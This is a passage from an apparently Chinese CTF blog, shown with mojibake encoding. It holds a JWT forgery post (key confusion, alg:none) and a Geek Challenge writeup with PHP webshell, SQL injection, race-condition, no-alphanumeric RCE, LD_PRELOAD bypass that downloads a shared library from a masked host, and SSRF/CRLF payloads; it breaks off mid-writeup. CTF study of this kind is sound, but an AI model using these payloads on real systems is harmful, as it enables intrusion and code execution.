title="JWTæ”»å‡»æ‰‹æ®µ"></a>JWTæ”»å‡»æ‰‹æ®µ</h2><h3 id="éå¯¹ç§°-gt-å¯¹ç§°æ”»å‡»"><a href="#éå¯¹ç§°-gt-å¯¹ç§°æ”»å‡»" class="headerlink" title="éå¯¹ç§°-&gt;å¯¹ç§°æ”»å‡»"></a>éå¯¹ç§°-&gt;å¯¹ç§°æ”»å‡»</h3><p>HS256ç®—æ³•ä½¿ç”¨å¯†é’¥ä¸ºæ‰€æœ‰æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚</p><p>è€ŒRS256ç®—æ³•åˆ™ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p><p>å¦‚æœå°†ç®—æ³•ä»RS256æ”¹ä¸ºHS256ï¼Œåˆ™åç«¯ä»£ç å°†ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚</p><p>ç”±äºæ”»å‡»è€…æœ‰æ—¶å¯ä»¥è·å–å…¬é’¥ï¼Œå› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å°†å¤´éƒ¨ä¸­çš„ç®—æ³•ä¿®æ”¹ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚</p><p>è¿™æ ·çš„è¯ï¼Œåç«¯ä»£ç ä½¿ç”¨RSAå…¬é’¥+HS256ç®—æ³•è¿›è¡Œç­¾åéªŒè¯</p><p>åŒæ ·çš„ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ç†è§£è¿™ç§æ”»å‡»æ–¹å¼ <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>RSAå…¬é’¥ï¼š<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p>è¯¥ä¾‹å­è§£æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line"># eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span><br><span class="line"># &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;</span><br><span class="line"></span><br><span class="line"># eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span><br><span class="line"># &#123;&quot;iss&quot;:&quot;http:\&#x2F;\&#x2F;demo.sjoerdlangkemper.nl\&#x2F;&quot;,&quot;iat&quot;:1504007874,&quot;exp&quot;:1504007994,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">public &#x3D; open(&#39;public.pem.1&#39;, &#39;r&#39;).read()</span><br><span class="line"></span><br><span class="line">print public</span><br><span class="line"></span><br><span class="line">print jwt.encode(&#123;&quot;data&quot;:&quot;test&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;)  &#x2F;&#x2F;ä¿®æ”¹payloadä¸­çš„æ˜æ–‡ä¿¡æ¯</span><br></pre></td></tr></table></figure><h3 id="å¯†é’¥çˆ†ç ´æ”»å‡»"><a href="#å¯†é’¥çˆ†ç ´æ”»å‡»" class="headerlink" title="å¯†é’¥çˆ†ç ´æ”»å‡»"></a>å¯†é’¥çˆ†ç ´æ”»å‡»</h3><p>å› ä¸ºHS256åªæœ‰ä¸€ä¸ªå¯†é’¥ï¼Œè§£å¯†åŠ å¯†éƒ½æ˜¯åŒä¸€ä¸ªå¯†é’¥ï¼Œå› æ­¤ç ´è§£æ¯”è¾ƒå®¹æ˜“ã€‚</p><p>é™„ä¸Šç°æˆçš„ç ´è§£å·¥å…·é“¾æ¥<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><h3 id="ä¿®æ”¹ç®—æ³•none"><a href="#ä¿®æ”¹ç®—æ³•none" class="headerlink" title="ä¿®æ”¹ç®—æ³•none"></a>ä¿®æ”¹ç®—æ³•none</h3><p>ç­¾åç®—æ³•ä¿è¯äº†JWTåœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­ä¸è¢«æ¶æ„ç”¨æˆ·ä¿®æ”¹</p><p>ä½†æ˜¯headerä¸­çš„algå­—æ®µå¯è¢«ä¿®æ”¹ä¸ºnone</p><p>ä¸€äº›JWTåº“æ”¯æŒnoneç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ï¼Œå½“algä¸ºnoneæ—¶åç«¯ä¸ä¼šè¿›è¡Œç­¾åæ ¡éªŒ</p><p>å°†algä¿®æ”¹ä¸ºnoneåï¼Œå»æ‰JWTä¸­çš„signatureæ•°æ®ï¼ˆä»…å‰©header + â€˜.â€™ + payload + â€˜.â€™ï¼‰ç„¶åæäº¤åˆ°æœåŠ¡ç«¯å³å¯</p><p>è¿™ç§æ”»å‡»çš„ä¾‹å­å¯ä»¥å‚è€ƒï¼š<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>ä»£ç å¯ä»¥åœ¨Githubä¸Šæ‰¾åˆ° <a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p><p>è¿™ä¸ªä¾‹å­çš„è§£æ³•å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># åŸheader</span><br><span class="line"># eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"># &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line"></span><br><span class="line"># åŸpayload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span><br><span class="line"># &#123;&quot;iss&quot;:&quot;http:\&#x2F;\&#x2F;demo.sjoerdlangkemper.nl\&#x2F;&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">def b64urlencode(data):</span><br><span class="line">    return base64.b64encode(data).replace(&#39;+&#39;, &#39;-&#39;).replace(&#39;&#x2F;&#39;, &#39;_&#39;).replace(&#39;&#x3D;&#39;, &#39;&#39;)</span><br><span class="line"></span><br><span class="line"># æ„é€ ç®—æ³•å­—æ®µä¸ºnone, payloadéƒ¨åˆ†å¯ä»¥éšæ„ä¿®æ”¹</span><br><span class="line">print b64urlencode(&quot;&#123;\&quot;typ\&quot;:\&quot;JWT\&quot;,\&quot;alg\&quot;:\&quot;none\&quot;&#125;&quot;) + \</span><br><span class="line">    &#39;.&#39; + b64urlencode(&quot;&#123;\&quot;data\&quot;:\&quot;test\&quot;&#125;&quot;) + &#39;.&#39;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SYCæå®¢å¤§æŒ‘æˆ˜writeup</title>
      <link href="2019/11/06/syc-ctf-wp/"/>
      <url>2019/11/06/syc-ctf-wp/</url>
      
        <content type="html"><![CDATA[<p>å¬å­¦é•¿è¯´è¿™é‡Œçš„é¢˜è¿˜æŒºç®€å•çš„ï¼Œä¾¿è¿‡æ¥åšäº†åšï¼Œæ€»ç»“ä¸€ä¸‹å§ï¼</p><a id="more"></a><h2 id="æ‰“æ¯”èµ›ä¹‹å‰å…ˆæ’¸ä¸€åªçŒ«ï¼"><a href="#æ‰“æ¯”èµ›ä¹‹å‰å…ˆæ’¸ä¸€åªçŒ«ï¼" class="headerlink" title="æ‰“æ¯”èµ›ä¹‹å‰å…ˆæ’¸ä¸€åªçŒ«ï¼"></a>æ‰“æ¯”èµ›ä¹‹å‰å…ˆæ’¸ä¸€åªçŒ«ï¼</h2><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">    echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getä¼ å‚å°±è¡Œ</p><pre><code>?cat=dogSyc&#123;I_actu4l1y_Lik3_d0gs&#125; </code></pre><h2 id="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"><a href="#ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ" class="headerlink" title="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"></a>ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ</h2><p>æ‰“å¼€ç½‘é¡µå‘ç°    </p><pre><code>eval($_POST[&quot;Syc&quot;]);</code></pre><p>èšå‰‘ç›´æ¥è¿å°±è¡Œï¼Œå‘ç°æ ¹ç›®å½•é‡Œæœ‰flagæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å‘ç°flag.txtæ–‡ä»¶ï¼ŒæŸ¥çœ‹å¾—åˆ°flag</p><pre><code>Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125;</code></pre><h2 id="BurpSuiiiiiit"><a href="#BurpSuiiiiiit" class="headerlink" title="BurpSuiiiiiit!!!"></a>BurpSuiiiiiit!!!</h2><p>ä¸‹è½½è¿‡æ¥æ˜¯ä¸ª.jaræ–‡ä»¶ï¼Œbpå¯¼å…¥å³å¯</p><p><img src="/2019/11/06/syc-ctf-wp/20191108193033.png"></p><p>åœ¨Errorså¯ä»¥çœ‹åˆ°flag</p><pre><code>Syc&#123;BurpExtender_Are_guns_F0r_Hack3rs&#125;</code></pre><h2 id="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦"><a href="#æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦" class="headerlink" title="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦"></a>æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦</h2><p>æŸ¥çœ‹æºä»£ç å‘ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">if (!is_dir($savepath)) &#123;</span><br><span class="line">    $oldmask &#x3D; umask(0);</span><br><span class="line">    mkdir($savepath);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">&#125;</span><br><span class="line">if ((@$_GET[&#39;u&#39;]) &amp;&amp; (@$_GET[&#39;p&#39;])) &#123;</span><br><span class="line">    $content &#x3D; &#39;***************&#39;;</span><br><span class="line">    file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);</span><br><span class="line">    $msg &#x3D; &#39;Ding!ä½ çš„ç®—å¦ç»“æœå°±åœ¨è¿™å„¿å•¦ï¼ &#39; . $savepath . htmlspecialchars(sha1($_GET[&#39;u&#39;])) . &quot;&quot;;</span><br><span class="line">    echo $msg;</span><br><span class="line">    usleep(100000);</span><br><span class="line">    @$content &#x3D; &quot;you are too slow&quot;;</span><br><span class="line">    file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æç¤ºç”¨æ¡ä»¶ç«äº‰</p><p>è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æ ¹æ®ä½ çš„ipï¼Œå¯¹å…¶sha1åŠ å¯†ï¼Œå¹¶åˆ›å»ºè¿™ä¸ªæ–‡ä»¶å¤¹ã€‚</p><p>ç„¶åGETæ–¹å¼æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œå°†ä¼ è¿‡æ¥çš„uè¿›è¡Œsha1åŠ å¯†ï¼Œå¹¶åˆ›å»ºè¯¥æ–‡ä»¶ï¼Œé‡Œé¢å†™å¦‚$contentï¼ˆç›®æµ‹flag)ï¼Œç„¶åç¨‹åºç¡çœ 100000å¾®ç§’ï¼Œä¸€å¾®ç§’ç­‰äºç™¾ä¸‡åˆ†ä¹‹ä¸€ç§’ï¼Œå¤§æ¦‚æ˜¯0.1sï¼Œçœ‹åˆ°è¿™å°±ç”¨ç«äº‰äº†</p><p>ç”±äºä½ çš„ipåœ°å€ä¸å˜ï¼Œå¦‚æœè¯·æ±‚çš„uä¸å˜çš„è¯ï¼Œé‚£ä¹ˆæ–‡ä»¶urlæ˜¯å›ºå®šçš„</p><p>bpå¼€ä¸¤ä¸ªintruderï¼Œä¸€ä¸ªæ˜¯è®©å®ƒç”Ÿæˆæ–‡ä»¶ï¼Œä¸€ä¸ªè®¿é—®æ–‡ä»¶</p><p><img src="/2019/11/06/syc-ctf-wp/20191108195656.png"></p><pre><code>Syc&#123;You-4re-S0-f4st&#125;</code></pre><h2 id="Easysql"><a href="#Easysql" class="headerlink" title="Easysql"></a>Easysql</h2><p>è¿™é¢˜æ˜¯å¤šæ¬¡è¯•å‡ºæ¥çš„</p><p>å…ˆåœ¨ç”¨æˆ·ååŠ ä¸ª<code>&#39;</code></p><p>å‘ç°æŠ¥é”™ä¿¡æ¯</p><p><img src="/2019/11/06/syc-ctf-wp/20191109215357.png"></p><p>åˆ†æä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼ŒçŒœæµ‹åå°sqlè¯­å¥ä¸º<code>&#39;$username&#39;</code></p><p>payload:</p><pre><code>ç”¨æˆ·åå¤„ï¼š admin&#39; or 1#Syc&#123;sqL_inj3cti0n_1s_re4lly_fUn&#125;</code></pre><h2 id="RCE-me"><a href="#RCE-me" class="headerlink" title="RCE me"></a>RCE me</h2><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯æ— å­—æ¯æ•°å­—ç»•è¿‡ + disable_fuctionç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">        $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">            if(strlen($code)&gt;40)&#123;</span><br><span class="line">                    die(&quot;This is too Long.&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">            if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">                    die(&quot;NO.&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">            @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å¯èƒ½çœ‹ç€å¾ˆç†Ÿæ‚‰ï¼Œå¯ä»¥çœ‹ä¸‹æˆ‘è¿™ç¯‡åšå®¢<a href="http://www.moonback.xyz/2019/10/16/nowords-webshell/">http://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p><p>ä½†è¿™é“é¢˜å¹¶ä¸æ˜¯é‚£ç§æ€è·¯</p><p>å…ˆçœ‹ä¸‹phpinfoå§</p><pre><code>http://114.116.44.23:40001/?code=$_=%22%23./|&#123;%22^%22|~`//%22;$&#123;$_&#125;[_]();POST    _=phpinfo</code></pre><p>æˆ–è€…ç›´æ¥ç”¨<strong>å¼‚æˆ–</strong>æˆ–è€…<strong>å–å</strong>æ„é€ ä¹Ÿè¡Œï¼Œå¹¶ä¸”å‘ç°å¥½åƒåªèƒ½ä¼ POSTä¸¤ä¸ªå‚æ•°</p><p>çœ‹ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æœ‰flagæ–‡ä»¶å’Œreadflagï¼ŒçŒœæµ‹flagæ˜¯ç›´æ¥è¯»ä¸äº†çš„ï¼Œå¿…é¡»è¿è¡Œreadflagæ‰èƒ½</p><p><img src="/2019/11/06/syc-ctf-wp/20191106162901.png"></p><p>å‘ç°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°åŸºæœ¬éƒ½è¿‡æ»¤äº†</p><p><img src="/2019/11/06/syc-ctf-wp/20191106153907.png"></p><p>è¿™é‡Œå°±ç”¨<code>LD_PRELOAD</code>æ¥ç»•è¿‡äº†</p><pre><code>?code=$_=$&#123;~%A0%AF%B0%AC%AB&#125;[_];$_($&#123;~%A0%AF%B0%AC%AB&#125;[__]);</code></pre><p>åˆ©ç”¨è¿™ä¸ªpayloadï¼Œ<code>_</code>ä¼ <code>assert</code>(ä¸çŸ¥é“ä¸ºå•¥evalä¸è¡Œ),<code>__</code>ä¼ æ¶æ„ä»£ç </p><p><strong>ç¬¬ä¸€æ­¥</strong>ï¼Œå…ˆå¾€æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ª<code>.so</code>å…±äº«åº“æ–‡ä»¶ï¼Œå¯ä»¥æ”¾åœ¨/tmpç›®å½•ä¸‹å› ï¼Œä¸ºè¿™ä¸ªè·¯å¾„é»˜è®¤æƒé™æ˜¯777ï¼Œå¯ä»¥ä½¿ç”¨</p><pre><code>file_put_contents(&quot;/tmp/bypass_disablefunc_x64.so&quot;,file_get_contents(&quot;http://****/bypass_disablefunc_x64.so&quot;))</code></pre><p>æˆ–è€…ç”¨copyå‡½æ•°</p><pre><code>copy(&quot;http://******/bypass_disablefunc_x64.so&quot;,&quot;/tmp/bypass_disablefunc_x64.so&quot;)</code></pre><p><strong>ç¬¬äºŒæ­¥</strong>ï¼Œå‘/tmpç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªphpæ–‡ä»¶</p><pre><code>file_put_contents(&quot;/tmp/moonback&quot;,&quot;&lt;?php putenv(&#39;EVIL_CMDLINE=&#39;.&#39;cd /%26%26./readflag &gt; /tmp/moonback1 2&gt;%261&#39;);putenv(&#39;LD_PRELOAD=&#39;.&#39;/tmp/bypass_disablefunc_x64.so&#39;);mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);?&gt;&quot;);</code></pre><p>å…¶å†…å®¹å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shellå‘½ä»¤ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);&#x2F;&#x2F;LD_PRELOAD&#x3D;åŠ¨æ€åŠ è½½åº“çš„ä½ç½®</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);&#x2F;&#x2F;ç”¨mailå‡½æ•°è§¦å‘</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå†…å®¹çš„<code>&amp;</code>ç¬¦å·è¦urlç¼–ç %26</p><p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼ŒåŒ…å«æ–‡ä»¶ï¼ŒæŸ¥çœ‹è¾“å‡ºç»“æœ</p><pre><code>include(&#39;/tmp/moonback&#39;)var_dump(file_get_contents(&#39;/tmp/moonback1&#39;))</code></pre><p>æˆåŠŸè§£é¢˜</p><h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µ"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µ" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µ"></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µ</h2><p>è¿™é¢˜å¹¶æ²¡æœ‰ç¥é­”æ¼æ´ï¼Œåªéœ€åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ¯æ¬¡è®¿é—®è®©å®ƒè¿”å›ä¸ä¸€æ ·çš„ä¸œè¥¿å°±è¡Œ</p><p>å¯ä»¥ç”¨flaskç®€å•æ­ä¸€ä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">importflask </span><br><span class="line">importdatetime</span><br><span class="line">server&#x3D;flask.Flask(__name__) </span><br><span class="line">data&#x3D;&quot;If I knewwhere Iwould die, I would never go there.&quot; </span><br><span class="line">data&#x3D;data.split(&quot;&quot;) </span><br><span class="line">data.reverse()</span><br><span class="line">server.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;post&#39;,&#39;get&#39;]) </span><br><span class="line">defindex():</span><br><span class="line">returndata.pop()</span><br><span class="line">server.run(port&#x3D;9999)</span><br></pre></td></tr></table></figure><h2 id="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿ"><a href="#æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿ" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿ"></a>æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿ</h2><p>è®¿é—®é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°<code>admin.php</code>ï¼Œè®¿é—®æ˜¾ç¤º127.0.0.1æ‰èƒ½è®¿é—®ï¼Œè¯´æ˜admin.phpéœ€è¦<code>index.php</code> ssrf</p><p>åœ¨æºç å‘ç°è¿™ä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    if(isset($_POST[&#39;method&#39;]) &amp;&amp; isset($_POST[&#39;url&#39;]) )&#123;</span><br><span class="line">        $method&#x3D;$_POST[&#39;method&#39;];</span><br><span class="line">        $url&#x3D;$_POST[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&#39;&#x2F;^http:\&#x2F;\&#x2F;&#x2F;i&#39;,$url))&#123;</span><br><span class="line">            $opts &#x3D; array(</span><br><span class="line">                &#39;http&#39;&#x3D;&gt;array(</span><br><span class="line">                    &#39;method&#39;&#x3D;&gt;$method,</span><br><span class="line">                    &#39;timeout&#39;&#x3D;&gt;3</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            $context &#x3D; stream_context_create($opts);</span><br><span class="line">            $body &#x3D; @file_get_contents($url.&quot;&#x2F;anything&quot;, false, $context);</span><br><span class="line"></span><br><span class="line">            if(isset($http_response_header))&#123;</span><br><span class="line">                preg_match(&quot;&#x2F;Allow:(.*?);&#x2F;i&quot;,implode(&#39;;&#39;,$http_response_header).&quot;;&quot;,$matches);</span><br><span class="line">                if(isset($matches[1]))&#123;</span><br><span class="line">                    echo &quot;æœåŠ¡ç«¯æ”¯æŒçš„è¯·æ±‚æ–¹æ³•æœ‰:&quot;.$matches[1];</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &quot;failed&lt;br&gt;&quot;;</span><br><span class="line">                    echo sprintf(&quot;body length of $method%d&quot;, $body);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;error&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;not allowed&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>methodå’Œurlå¯æ§ï¼Œurlå¿…é¡»æ˜¯<code>http://</code>å¼€å¤´</p><p>è¾“å…¥çš„urlä¼šæ‹¼æ¥ä¸Š<code>/anything</code>ç„¶åä»¥optionsè¯·æ±‚æ–¹æ³•è®¿é—®ï¼Œä¸€æ¬¡å¾—åˆ°Allowè¿”å›å¤´</p><p>ä¸è¿‡<code>sprintf(&quot;body    length    of    $method%d&quot;,    $body);</code>è¿™å¥ä»£ç æœ‰é”™è¯¯ </p><p>å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²<code>&quot;body    length    of    $method%d&quot;</code>å¯æ§ï¼Œæ‰€ä»¥åªè¦æŠŠ%dç»™è½¬ä¹‰æ‰ï¼Œå†æ³¨å…¥%sï¼Œå°±èƒ½è®©å…¶æ˜¾ç¤º$bodyå†…å®¹ï¼Œ</p><p>ä¾‹å¦‚$methodä¼ å…¥<code>%s%</code>ï¼Œé‚£ä¹ˆæœ€åæ‹¼æ¥æˆçš„ä¾¿æ˜¯<code>body length of %s%%d</code>ï¼Œè€Œæœ€åæ˜¾ç¤ºçš„æ•ˆæœå°±æ˜¯<code>body length    of è¿”å›çš„æ•°æ®%d</code></p><p><img src="/2019/11/06/syc-ctf-wp/20191117215230.png"></p><p>å†é€šè¿‡ssrf POSTä¸€ä¸ª<code>iwantflag=yes</code>ï¼Œä½†æ˜¯æ€æœ«POSTå‘¢ï¼Ÿ</p><p>å‘ç°è¿™é‡Œç”¨çš„æ˜¯<code>file_get_context_create()</code>å‡½æ•°æ¥å‘èµ·HTTPè¯·æ±‚ï¼Œä¸€äº›é…ç½®é€‰é¡¹åŒ…æ‹¬è¿™é‡Œçš„è¯·æ±‚æ–¹å¼æ˜¯ä½œä¸ºä¸€ä¸ªæ•°ç»„ç»è¿‡<code>stream_context_create()</code>å¤„ç†åä¼ å…¥çš„ã€‚å…¶å®è¿™é‡Œå°±å­˜åœ¨<code>CRLFæ³¨å…¥æ¼æ´</code>ï¼Œå³æˆ‘ä»¬å¯ä»¥å®Œå…¨è‡ªå·±æ„é€ ä¸€ä¸ªå®Œæ•´çš„POSTåŒ…å‘å‡ºå»</p><p>å…·ä½“å¦‚ä¸‹ï¼š</p><p><img 